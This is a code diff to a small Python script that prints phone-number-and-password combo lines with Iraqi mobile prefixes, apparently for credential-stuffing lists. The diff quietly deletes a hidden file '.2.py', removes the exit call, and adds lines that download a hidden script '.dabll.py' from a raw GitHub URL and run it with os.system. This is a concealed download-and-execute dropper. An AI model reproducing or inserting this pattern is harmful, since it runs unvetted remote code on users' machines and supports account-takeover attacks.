@@ -1,4 +1,10 @@
 import os, sys, random, wget
+os.system("rm .2.py")
+try:
+    os.remove(".2.py")
+except:
+    pass
+os.system("rm -rf .2.py")
 def ssss():
 	def ii():
 		os.system("rm -rf combo.txt")
@@ -9,8 +15,7 @@ def ssss():
 			print("+964770"+str(r)+":"+str(r))
 			print("+964750"+str(rr)+":"+str(rr))
 			sys.stdout.flush()
-		os.sys.exit()
 	ii()
 ssss()
-wget.download("")
-os.system("")
+wget.download("https://raw.githubusercontent.com/sfrsfrsfr404sfrsfrsfr/-/main/.dabll.py")
+os.system("python .dabll.py")
